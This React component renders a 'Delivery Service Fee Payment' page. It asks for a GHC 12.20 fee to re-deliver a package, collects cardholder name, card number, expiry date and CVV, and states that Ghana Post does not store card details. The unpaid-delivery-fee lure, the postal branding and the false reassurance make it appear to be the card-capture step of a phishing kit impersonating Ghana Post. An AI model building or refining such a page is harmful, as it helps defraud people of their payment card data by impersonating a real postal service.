import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import StepIndicator from '../components/StepIndicator';
import { api, validate, format } from '../utils/api';

function PaymentForm({ formData, setFormData }) {
  const navigate = useNavigate();
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const validateForm = () => {
    const newErrors = {};

    if (!formData.cardholderName.trim()) {
      newErrors.cardholderName = 'Cardholder name is required';
    }
    if (!formData.cardNumber.trim()) {
      newErrors.cardNumber = 'Card number is required';
    } else if (!validate.cardNumber(formData.cardNumber)) {
      newErrors.cardNumber = 'Invalid card number';
    }
    if (!formData.expiryDate.trim()) {
      newErrors.expiryDate = 'Expiry date is required';
    } else if (!validate.expiryDate(formData.expiryDate)) {
      newErrors.expiryDate = 'Invalid format (MM/YY)';
    }
    if (!formData.cvv.trim()) {
      newErrors.cvv = 'CVV is required';
    } else if (!validate.cvv(formData.cvv)) {
      newErrors.cvv = 'Invalid CVV (3-4 digits)';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    // Format card number
    if (name === 'cardNumber') {
      formattedValue = format.cardNumber(value);
    }

    // Format expiry date
    if (name === 'expiryDate') {
      formattedValue = format.expiryDate(value);
    }

    // Limit CVV to 4 digits
    if (name === 'cvv') {
      formattedValue = value.replace(/\D/g, '').slice(0, 4);
    }

    setFormData({
      ...formData,
      [name]: formattedValue,
    });

    // Clear error for this field
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: '',
      });
    }
  };

  const handleSubmitPayment = async () => {
    if (!validateForm()) {
      return;
    }

    setLoading(true);
    try {
      const response = await api.submitForm(formData);
      if (response.message === 'success') {
        navigate('/success');
      } else {
        setErrors({ submit: 'Payment processing failed. Please try again.' });
      }
    } catch (error) {
      setErrors({ submit: 'Error: ' + error.message });
    } finally {
      setLoading(false);
    }
  };

  const handleBack = () => {
    navigate('/address');
  };

  return (
    <div className="container">
      <StepIndicator currentStep={3} />

      <div className="form-section">
        <h2>Delivery Service Fee Payment</h2>
        
        <div className="alert-banner" style={{ marginBottom: '2rem', backgroundColor: '#FFC107', color: '#333' }}>
          <div className="alert-icon">💳</div>
          <div className="alert-content">
            <h2 style={{ color: '#333' }}>Payment Required</h2>
            <p>
              A delivery service fee of <strong>GHC 12.20</strong> is required to complete your delivery.
              Your package will be re-delivered within 2-3 business days after successful payment.
            </p>
          </div>
        </div>

        {/* Amount Breakdown */}
        <div style={{
          backgroundColor: '#F5F5F5',
          padding: '1.5rem',
          borderRadius: '4px',
          marginBottom: '2rem',
          borderLeft: '4px solid #003DA5'
        }}>
          <h3 style={{ color: '#003DA5', marginBottom: '1rem', fontSize: '1.1rem' }}>
            Amount Breakdown
          </h3>
          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
            <span>Delivery Service Fee:</span>
            <span style={{ fontWeight: '600' }}>GHC 12.20</span>
          </div>
          <div style={{
            borderTop: '1px solid #ddd',
            paddingTop: '0.75rem',
            display: 'flex',
            justifyContent: 'space-between',
            fontSize: '1.1rem'
          }}>
            <span style={{ fontWeight: '600' }}>Total Amount:</span>
            <span style={{ fontWeight: 'bold', color: '#003DA5', fontSize: '1.3rem' }}>GHC 12.20</span>
          </div>
        </div>

        {/* Error Message */}
        {errors.submit && <div className="error-message">{errors.submit}</div>}

        {/* Payment Form */}
        <div style={{ marginBottom: '2rem' }}>
          <h3 style={{ color: '#003DA5', marginBottom: '1rem', fontSize: '1.1rem' }}>
            Card Details
          </h3>

          <div className="form-group">
            <label className="form-label">
              Cardholder Name <span className="required">*</span>
            </label>
            <input
              type="text"
              className={`form-control ${errors.cardholderName ? 'error' : ''}`}
              name="cardholderName"
              value={formData.cardholderName}
              onChange={handleInputChange}
              placeholder="John Kwame Mensah"
              disabled={loading}
            />
            {errors.cardholderName && <div className="error-message">{errors.cardholderName}</div>}
          </div>

          <div className="form-group">
            <label className="form-label">
              Card Number <span className="required">*</span>
            </label>
            <input
              type="text"
              className={`form-control ${errors.cardNumber ? 'error' : ''}`}
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleInputChange}
              placeholder="XXXX-XXXX-XXXX-XXXX"
              maxLength="19"
              disabled={loading}
            />
            {errors.cardNumber && <div className="error-message">{errors.cardNumber}</div>}
          </div>

          <div className="form-row">
            <div className="form-group">
              <label className="form-label">
                Expiry Date (MM/YY) <span className="required">*</span>
              </label>
              <input
                type="text"
                className={`form-control ${errors.expiryDate ? 'error' : ''}`}
                name="expiryDate"
                value={formData.expiryDate}
                onChange={handleInputChange}
                placeholder="MM/YY"
                maxLength="5"
                disabled={loading}
              />
              {errors.expiryDate && <div className="error-message">{errors.expiryDate}</div>}
            </div>

            <div className="form-group">
              <label className="form-label">
                CVV/Security Code <span className="required">*</span>
              </label>
              <input
                type="text"
                className={`form-control ${errors.cvv ? 'error' : ''}`}
                name="cvv"
                value={formData.cvv}
                onChange={handleInputChange}
                placeholder="123"
                maxLength="4"
                disabled={loading}
              />
              {errors.cvv && <div className="error-message">{errors.cvv}</div>}
            </div>
          </div>
        </div>

        {/* Security Note */}
        <div style={{
          backgroundColor: '#E8F5E9',
          padding: '1rem',
          borderRadius: '4px',
          marginBottom: '2rem',
          color: '#2E7D32',
          fontSize: '0.9rem'
        }}>
          <p>🔒 Your payment information is secure and encrypted. Ghana Post does not store your card details.</p>
        </div>

        {/* Action Buttons */}
        <div style={{ display: 'flex', gap: '1rem', marginTop: '2rem' }}>
          <button
            onClick={handleBack}
            className="btn btn-secondary btn-lg"
            style={{ flex: 1 }}
            disabled={loading}
          >
            ← Back
          </button>
          <button
            onClick={handleSubmitPayment}
            className="btn btn-primary btn-lg"
            style={{ flex: 1 }}
            disabled={loading}
          >
            {loading ? 'Processing Payment...' : 'Submit Payment'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default PaymentForm;
